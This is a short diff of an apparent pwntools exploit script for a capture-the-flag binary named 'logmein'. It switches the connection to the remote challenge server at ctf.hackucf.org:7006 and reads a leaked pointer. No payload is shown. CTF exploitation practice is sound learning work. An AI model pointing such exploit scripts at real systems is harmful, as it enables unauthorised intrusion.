@@ -1,10 +1,10 @@
 from pwn import *
 import struct
-#io = remote("ctf.hackucf.org", 7006)
+io = remote("ctf.hackucf.org", 7006)
 
 exe = context.binary = ELF('logmein')
 
-io = exe.process()
+#io = exe.process()
 io.recvuntil("user = ")
 ptr = io.recvline().strip()
 print(ptr)
